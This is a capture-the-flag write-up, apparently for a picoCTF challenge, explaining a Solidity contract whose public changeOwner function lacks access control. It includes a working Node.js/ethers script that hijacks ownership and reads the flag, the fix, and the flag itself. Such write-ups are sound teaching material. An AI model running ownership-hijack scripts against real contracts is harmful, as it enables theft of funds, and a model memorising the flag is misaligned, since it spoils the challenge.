# 🧨 AccessControl Smart Contract Exploit Writeup

## 📌 Challenge Description
We are given a Solidity smart contract that stores a secret flag. The contract claims that only the owner can access the flag.

---

## 🔍 Contract Analysis

```solidity
function changeOwner(address _newOwner) public {
    address oldOwner = owner;
    owner = _newOwner;
    emit OwnerChanged(oldOwner, _newOwner);
}
```

### 🚨 Vulnerability

- The `changeOwner` function is **public**
- There is **no access control**
- No `require(msg.sender == owner)` check

👉 This means **any user can change the contract owner**

---

## 🧠 Exploit Strategy

To retrieve the flag:

1. Become the owner
2. Call the protected `solve()` function
3. Retrieve the flag using `getFlag()`

---

## ⚙️ Exploitation Steps

### 1. Change Owner

```
changeOwner(<your_address>)
```

---

### 2. Call solve()

```
solve()
```

---

### 3. Get the Flag

```
getFlag()
```

---

## 💻 Exploit Script (Node.js + Ethers)

```javascript
const { ethers } = require("ethers");

const RPC_URL = "YOUR_RPC_URL";
const PRIVATE_KEY = "YOUR_PRIVATE_KEY";
const CONTRACT = "CONTRACT_ADDRESS";

const abi = [
  "function changeOwner(address _newOwner)",
  "function solve()",
  "function getFlag() view returns (string)"
];

async function main() {
  const provider = new ethers.JsonRpcProvider(RPC_URL);
  const wallet = new ethers.Wallet(PRIVATE_KEY, provider);
  const contract = new ethers.Contract(CONTRACT, abi, wallet);

  console.log("[+] Changing owner...");
  await (await contract.changeOwner(wallet.address)).wait();

  console.log("[+] Calling solve...");
  await (await contract.solve()).wait();

  console.log("[+] Getting flag...");
  const flag = await contract.getFlag();

  console.log("FLAG:", flag);
}

main();
```

---

## 🏁 Conclusion

- ❌ Missing access control on `changeOwner`
- ❌ Any user can hijack ownership
- ✅ Ownership check in `solve()` becomes useless
- 🎯 Exploit allows full access to the flag

---

## 🔐 Lesson Learned

Always restrict sensitive functions:

```solidity
require(msg.sender == owner, "Not authorized");
```

Access control is critical in smart contracts.

---

## 🚩 Flag

```
picoCTF{i_c4n_b3_0wn3r_f5061ac6}
```
